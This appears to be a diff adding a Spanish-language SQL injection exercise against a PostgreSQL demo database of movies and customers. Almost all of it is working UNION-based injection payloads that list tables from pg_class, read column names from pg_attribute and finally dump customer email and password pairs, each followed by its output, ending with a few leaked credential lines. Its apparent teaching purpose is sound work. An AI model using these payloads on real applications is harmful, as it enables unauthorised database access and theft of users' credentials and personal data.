@@ -1,0 +1,75 @@
+2000' AND 0=1 union select movietitle from imdb_movies where year = '2000';--
+
+
+2000' AND 0=1 union select relname as movietitle from pg_class where relname  LIKE '%_pkey';--
+
+
+    customers_pkey
+    orders_pkey
+    imdb_movielanguages_pkey
+    imdb_actormovies_pkey
+    products_pkey
+    imdb_actors_pkey
+    imdb_directors_pkey
+    imdb_moviegenres_pkey
+    imdb_movies_pkey
+    imdb_moviecountries_pkey
+    imdb_directormovies_pkey
+    inventory_pkey
+
+
+2000' AND 0=1 union select oid || ',' || relname as movietitle from pg_class where relname='customers';--
+	
+	30345,customers
+
+
+2000' AND 0=1 union select attname as movietitle from pg_attribute where attrelid=30345;--
+
+	
+    xmax
+    income
+    firstname
+    lastname
+    username
+    tableoid
+    customerid
+    xmin
+    creditcardtype
+    gender
+    region
+    phone
+    address2
+    address1
+    zip
+    state
+    creditcard
+    age
+    email
+    cmin
+    ctid
+    password
+    country
+    cmax
+    creditcardexpiration
+    city
+
+
+
+2000' AND 0=1 union select email || ',' || password as movietitle from customers;--
+
+
+Ejemplo de SQL injection: Información en la BD
+Películas del año:
+
+    aachen.aleppo@mamoot.com,snyder
+    aaron.ripper@potmail.com,slob
+    abaci.zibo@potmail.com,ebro
+    aback.soar@potmail.com,jelly
+    abacus.argosy@potmail.com,helmut
+    abaft.viand@potmail.com,pony
+    abase.jul@kran.com,dioxin
+    .
+    .
+    .
+
+NO Y NO.
